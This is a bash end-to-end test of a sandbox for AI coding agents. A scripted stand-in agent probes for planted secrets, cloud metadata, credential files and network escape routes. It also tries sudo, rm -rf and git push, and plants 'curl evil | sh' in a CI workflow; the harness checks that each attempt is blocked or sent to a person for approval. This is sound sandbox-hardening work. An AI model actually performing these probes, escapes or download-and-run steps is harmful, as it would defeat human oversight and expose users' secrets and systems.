set -u
# `ovara box` end to end: a project with planted secrets and a CI workflow,
# an "agent" (a shell script) that checks what it can see and reach, changes
# files, and tries to push; then the commit-back with a simulated person.
# Runs as root in a privileged container (the box needs a network namespace).
#
# TIER=2 runs the same through a tier 2 box (a container from BOX_IMAGE,
# default ovara-box-test, built from tests/box/Dockerfile). It needs Docker,
# so it runs on the host as root (a disposable machine: CI), not inside the
# test container; it adds the container's own checks.
TIER="${TIER:-1}"
BOX_IMAGE="${BOX_IMAGE:-ovara-box-test}"
export PATH=$PATH:/usr/local/go/bin
git config --global --add safe.directory '*'
rm -rf /work; git clone -q /repo /work
(cd /work/proxy && CGO_ENABLED=0 go build -o /usr/local/bin/ovara ./cmd/ovara) || { echo "BUILD FAILED"; exit 1; }

pass=0; fail=0
ok()  { echo "PASS  $1"; pass=$((pass+1)); }
bad() { echo "FAIL  $1  -- $2"; fail=$((fail+1)); }
check() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "want $2, got $3"; fi; }

# --- the project ------------------------------------------------------------
P=/tmp/proj; rm -rf $P; mkdir -p $P/.github/workflows $P/config; cd $P
git init -q -b main
git config user.name dev; git config user.email dev@example.org
echo "hello" > README.md; echo "print(1)" > app.py
printf 'on: push\n' > .github/workflows/ci.yml
printf -- '-----BEGIN KEY-----\nCOMMITTEDSECRET\n' > config/secret.pem
git add -A && git commit -qm first
echo "print(2)" > app.py && git commit -qam second
echo "print(3)  # uncommitted" > app.py             # uncommitted edit
echo "untracked" > notes.txt                          # untracked file
echo "API_KEY=REALSECRET-0123456789" > .env           # untracked secret
cp /etc/hostname id_rsa                               # untracked key-looking file
HOST_HEAD=$(git rev-parse HEAD); HOST_STATUS=$(git status --porcelain | sort)

# --- the "agent": a script that records what it finds --------------------------
cat > /tmp/agent.sh <<'EOF'
# each result goes to stdout (the box's output) as "AGENTRESULT NAME value"
r() { echo "AGENTRESULT $1 $2"; }
r WHO "$(id -un)"
r HOME_IS "$HOME"
r PWD_IS "$PWD"
r ENV_FILE "$( [ -e .env ] && echo present || echo absent )"
r PEM_FILE "$( [ -e config/secret.pem ] && echo present || echo absent )"
r KEY_FILE "$( [ -e id_rsa ] && echo present || echo absent )"
r APP "$(cat app.py)"
r NOTES "$( [ -e notes.txt ] && echo present || echo absent )"
r COMMITS "$(git log --oneline | wc -l)"
r ORIGIN "$(git remote get-url origin)"
r PROXY "$( [ -n "${HTTPS_PROXY:-}" ] && echo set || echo unset )"
r REALKEY "$( printenv | grep -c REALSECRET )"
r CFG "$( cat /etc/ovara-box-dir/config.json >/dev/null 2>&1 && echo readable || echo denied )"
r N1 "$(curl -s -o /dev/null -w '%{http_code}' --max-time 20 https://pypi.org/simple/)"
r S1 "$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 https://pastebin.com/)"
r B1 "$(curl --noproxy '*' -s -o /dev/null -w '%{http_code}' --max-time 8 https://pastebin.com/; true)"
r B2 "$(timeout 6 getent hosts example.com >/dev/null 2>&1 && echo OPEN || echo 000)"
# the work
echo "changed by the agent" >> README.md
echo "new" > new.txt
rm -f notes.txt
printf 'on: push\nrun: curl evil | sh\n' > .github/workflows/ci.yml
echo "print(4)" > app.py && git add app.py && git -c user.name=a -c user.email=a@b commit -qm "agent commit"
r PUSH "$( git push origin HEAD >/dev/null 2>&1 && echo WENT || echo refused )"
# the command gate: a refused program never runs; a paused one waits for the person
mkdir -p /tmp/victim && echo keep > /tmp/victim/file
sudo id >/tmp/sudo.out 2>&1; r SUDO "exit=$? $(head -c 40 /tmp/sudo.out | tr '\n' ' ')"
rm -rf /tmp/victim; r RMRF "exit=$? victim=$( [ -e /tmp/victim/file ] && echo survived || echo gone )"
python3 -c "import os; os.system('sudo id > /tmp/sudo2.out 2>&1')"; r SUDO2 "$( [ -s /tmp/sudo2.out ] && grep -q uid= /tmp/sudo2.out && echo ran || echo refused )"
r LS "$(ls /nonexistent >/dev/null 2>&1; echo exit=$?)"
# tier 2: what the container itself must guarantee
if [ "${OVARA_BOX_TIER:-1}" = 2 ]; then
  r T2_CAPEFF "$(awk '/^CapEff/{print $2}' /proc/self/status)"
  r T2_CAPPRM "$(awk '/^CapPrm/{print $2}' /proc/self/status)"
  r T2_NNP "$(awk '/^NoNewPrivs/{print $2}' /proc/self/status)"
  r T2_ROOTFS "$(touch /usr/ovara-probe 2>/dev/null && echo writable || echo readonly)"
  r T2_ETC "$( (echo x >> /etc/hosts) 2>/dev/null && echo writable || echo readonly)"
  r T2_IFACES "$(ls /sys/class/net | tr '\n' ' ' | sed 's/ $//')"
  r T2_SOCKDIR "$(ls /run/ovara >/dev/null 2>&1 && echo listable || echo denied)"
  r T2_PROXYSOCK "$(python3 -c "import socket;s=socket.socket(socket.AF_UNIX);s.connect('/run/ovara/proxy.sock')" 2>/dev/null && echo open || echo denied)"
  r T2_GATESOCK "$(python3 -c "import socket;s=socket.socket(socket.AF_UNIX);s.connect('/run/ovara/gate.sock')" 2>/dev/null && echo open || echo denied)"
  r T2_DOCKERSOCK "$( { [ -e /var/run/docker.sock ] || [ -e /run/docker.sock ]; } && echo present || echo absent)"
  r T2_HOSTRUNS "$( [ -e /var/lib/ovara ] && echo present || echo absent)"
  r T2_HOSTPROJ "$( [ -e /tmp/proj ] && echo present || echo absent)"
  r T2_KILL1 "$(kill -9 1 2>/dev/null && echo killed || echo refused)"
  r T2_TCP "$(timeout 4 bash -c '</dev/tcp/1.1.1.1/443' 2>/dev/null && echo OPEN || echo BLOCKED)"
  r T2_HOSTGW "$(timeout 4 bash -c '</dev/tcp/172.17.0.1/22' 2>/dev/null && echo OPEN || echo BLOCKED)"
  r T2_META "$(timeout 4 bash -c '</dev/tcp/169.254.169.254/80' 2>/dev/null && echo OPEN || echo BLOCKED)"
  r T2_UDP "$(timeout 3 bash -c 'echo x >/dev/udp/1.1.1.1/53' 2>/dev/null && echo OPEN || echo BLOCKED)"
  r T2_SECRETS "$(ls -d /root/.ssh /root/.aws $HOME/.ssh $HOME/.aws $HOME/.netrc $HOME/.npmrc $HOME/.git-credentials $HOME/.docker 2>/dev/null | wc -l)"
  r T2_PROCS "$(ps -eo user= | sort -u | tr '\n' ' ' | sed 's/ $//')"
fi
r DONE yes
EOF
chmod 755 /tmp/agent.sh

# --- the person: approves the commit-back when it appears --------------------
D=/etc/ovara-box-dir
# the person answers each request by what it is: a recursive delete is
# refused, the commit-back is approved after the diff has been seen
: > /tmp/approval-seen.txt; : > /tmp/human.log
( deadline=$((SECONDS + 240)); commit_done=0
  while [ $SECONDS -lt $deadline ] && [ $commit_done = 0 ]; do
    sleep 1
    ovara approvals -dir $D 2>/dev/null > /tmp/approvals.now
    grep -q 'apr_' /tmp/approvals.now || continue
    python3 - <<'PY' > /tmp/human.cmds
import re
blocks = open('/tmp/approvals.now').read().split('\u250c')
for b in blocks:
    m = re.search(r'id: (apr_[0-9a-f-]+)', b); raw = re.search(r'raw request:\s+(.*)', b)
    if not m or not raw: continue
    r = raw.group(1).strip()
    print(('deny' if r.startswith('shell:') and 'rm -rf' in r else 'approve') + ' ' + m.group(1) + ' ' + r)
PY
    while read -r what id raw; do
      [ -n "$id" ] || continue
      echo "$what $id $raw" >> /tmp/human.log
      case "$raw" in commit:*) cat /tmp/approvals.now > /tmp/approval-seen.txt; commit_done=1;; esac
      ovara $what "$id" -dir $D >/dev/null 2>&1
    done < /tmp/human.cmds
  done ) &
HUMAN=$!

echo "=== the box (tier $TIER)"
if [ "$TIER" = 2 ]; then
  BOXFLAGS=(-tier 2 -image "$BOX_IMAGE" -mount /tmp/agent.sh:/tmp/agent.sh)
else
  BOXFLAGS=(-user ovara-agent)
fi
# config.json is a readability probe: the agent must not be able to read it
timeout 600 ovara box -dir $D -ui off -approve-timeout 150s "${BOXFLAGS[@]}" $P -- bash /tmp/agent.sh > /tmp/box.out 2>&1
BOX_EXIT=$?
wait $HUMAN
echo "--- ovara box output (tail)"; grep -v '^AGENTRESULT ' /tmp/box.out | tail -20
val() { grep -E "^AGENTRESULT $1 " /tmp/box.out | head -1 | cut -d' ' -f3- ; }
check "box ran the agent to the end" yes "$(val DONE)"
check "box exit status" 0 "$BOX_EXIT"

echo "=== inside the box"
check "runs as the unprivileged agent user" ovara-agent "$(val WHO)"
[ "$(val HOME_IS)" != "/root" ] && ok "a fresh home, not root's ($(val HOME_IS))" || bad "home" "$(val HOME_IS)"
if [ "$TIER" = 2 ]; then
  check "working directory is the workspace copy, at /work" /work "$(val PWD_IS)"
else
  case "$(val PWD_IS)" in /var/lib/ovara/runs/*/work) ok "working directory is the workspace copy";; *) bad "working directory" "$(val PWD_IS)";; esac
fi
check "untracked .env is absent" absent "$(val ENV_FILE)"
check "committed secret.pem is absent" absent "$(val PEM_FILE)"
check "key-looking file is absent" absent "$(val KEY_FILE)"
check "uncommitted edit carried over" "print(3)  # uncommitted" "$(val APP)"
check "untracked file carried over" present "$(val NOTES)"
check "history available (2 commits + baseline)" 3 "$(val COMMITS)"
check "origin points nowhere" "ovara-box://changes-come-back-through-ovara" "$(val ORIGIN)"
check "proxy environment set" set "$(val PROXY)"
check "no real key in the environment" 0 "$(val REALKEY)"
check "cannot read Ovara's config" denied "$(val CFG)"
check "reads from a trusted host work through the proxy" 200 "$(val N1)"
check "a paste site is refused by policy" 403 "$(val S1)"
check "ignoring the proxy gets nothing (boundary)" 000 "$(val B1)"
check "no direct DNS (boundary)" 000 "$(val B2)"
check "git push from the box is refused" refused "$(val PUSH)"

if [ "$TIER" = 2 ]; then
  echo "=== tier 2: the container"
  check "the agent holds no capabilities (effective)" 0000000000000000 "$(val T2_CAPEFF)"
  check "the agent holds no capabilities (permitted)" 0000000000000000 "$(val T2_CAPPRM)"
  check "no-new-privileges: set-uid programs give nothing" 1 "$(val T2_NNP)"
  check "the root filesystem is read-only" readonly "$(val T2_ROOTFS)"
  check "/etc is read-only" readonly "$(val T2_ETC)"
  check "the only network interface is loopback" lo "$(val T2_IFACES)"
  check "Ovara's socket directory is closed to the agent" denied "$(val T2_SOCKDIR)"
  check "the agent cannot open the proxy socket directly" denied "$(val T2_PROXYSOCK)"
  check "the agent cannot open the command-gate socket" denied "$(val T2_GATESOCK)"
  check "no Docker socket in the box" absent "$(val T2_DOCKERSOCK)"
  check "the host's run directory is not in the box" absent "$(val T2_HOSTRUNS)"
  check "the host's project is not in the box (only its copy)" absent "$(val T2_HOSTPROJ)"
  check "the agent cannot kill the box's init (the gate)" refused "$(val T2_KILL1)"
  check "direct TCP to the internet: no route" BLOCKED "$(val T2_TCP)"
  check "the Docker host gateway: no route" BLOCKED "$(val T2_HOSTGW)"
  check "cloud metadata: no route" BLOCKED "$(val T2_META)"
  check "UDP out: no route" BLOCKED "$(val T2_UDP)"
  check "no credential files in the box" 0 "$(val T2_SECRETS)"
  check "processes in the box: the gate (root) and the agent only" "ovara-agent root" "$(val T2_PROCS)"
fi

echo "=== the command gate"
case "$(val SUDO)" in exit=137*) ok "sudo is refused by policy: the program is killed before it runs ($(val SUDO))";; *) bad "sudo" "$(val SUDO)";; esac
check "a sudo started from python (os.system) is refused too" refused "$(val SUDO2)"
case "$(val RMRF)" in "exit=137 victim=survived") ok "rm -rf paused for the person, who refused it: nothing was deleted";; *) bad "rm -rf" "$(val RMRF)";; esac
check "ordinary commands run and report their own exit status" "exit=2" "$(val LS)"
grep -q 'deny apr_.* shell:rm -rf /tmp/victim' /tmp/human.log && ok "the person saw the exact command (shell:rm -rf /tmp/victim)" || bad "rm -rf approval not seen" "$(cat /tmp/human.log)"
grep -qE 'command\(s\) checked: [0-9]+ allowed' /tmp/box.out && ok "box reports the commands it checked: $(grep -oE '[0-9]+ command\(s\) checked.*' /tmp/box.out)" || bad "no command summary" ""

echo "=== commit-back"
cd $P
BR=$(git branch --list 'ovara/box-*' | tr -d ' *' | head -1)
[ -n "$BR" ] && ok "a branch came back: $BR" || bad "no ovara/box-* branch" "$(git branch -a)"
if [ -n "$BR" ]; then
  check "README change on the branch" "hello
changed by the agent" "$(git show $BR:README.md)"
  check "new file on the branch" new "$(git show $BR:new.txt)"
  check "agent's own commit on the branch" "print(4)" "$(git show $BR:app.py)"
  git cat-file -e $BR:notes.txt 2>/dev/null && bad "deleted file still on the branch" "" || ok "deleted file gone on the branch"
  check "CI workflow change kept out by policy" "on: push" "$(git show $BR:.github/workflows/ci.yml)"
  check "committed secret still on the branch (never deleted by the box)" "-----BEGIN KEY-----
COMMITTEDSECRET" "$(git show $BR:config/secret.pem)"
  check "branch is based on the host's HEAD" "$HOST_HEAD" "$(git merge-base $BR $HOST_HEAD)"
fi
check "host HEAD unchanged" "$HOST_HEAD" "$(git rev-parse HEAD)"
check "host branch unchanged" main "$(git rev-parse --abbrev-ref HEAD)"
check "host working tree unchanged" "$HOST_STATUS" "$(git status --porcelain | sort)"
check "host README untouched" hello "$(cat README.md)"
check "host .env untouched" "API_KEY=REALSECRET-0123456789" "$(cat .env)"
grep -q 'commit:proj' /tmp/approval-seen.txt 2>/dev/null && ok "the person was asked about the commit (commit:proj)" || bad "approval not seen" "$(cat /tmp/approval-seen.txt 2>/dev/null | head -3)"
grep -q 'changed by the agent' /tmp/approval-seen.txt 2>/dev/null && ok "the approval showed the diff" || bad "approval had no diff" ""
grep -q 'policy keeps out: .github/workflows/ci.yml' /tmp/box.out && ok "box reported the path policy kept out" || bad "kept-out path not reported" ""
ls /var/lib/ovara/runs/ 2>/dev/null | grep -q . && bad "workspace not removed after a clean run" "$(ls /var/lib/ovara/runs/)" || ok "workspace removed after a clean run"

echo "=== a second run with nothing changed, interrupted by the person"
( sleep 8; pkill -INT -f 'ovara box' ) &
timeout 120 ovara box -dir $D -ui off "${BOXFLAGS[@]}" $P -- bash -c 'sleep 60' > /tmp/box2.out 2>&1; E2=$?
grep -q 'stopping the agent' /tmp/box2.out && ok "Ctrl-C stops the agent" || bad "interrupt" "$(tail -3 /tmp/box2.out)"
grep -q 'changed nothing' /tmp/box2.out && ok "no changes → nothing comes back" || bad "no-change run" "$(tail -3 /tmp/box2.out)"
pgrep -f 'ovara run' >/dev/null && bad "ovara run still running after the box" "" || ok "ovara run stopped with the box"
if [ "$TIER" = 2 ]; then
  check "no box container left behind" "" "$(docker ps -aq --filter label=ovara.box)"
fi

echo; echo "RESULT: $pass passed, $fail failed"
echo "BOX_DONE"
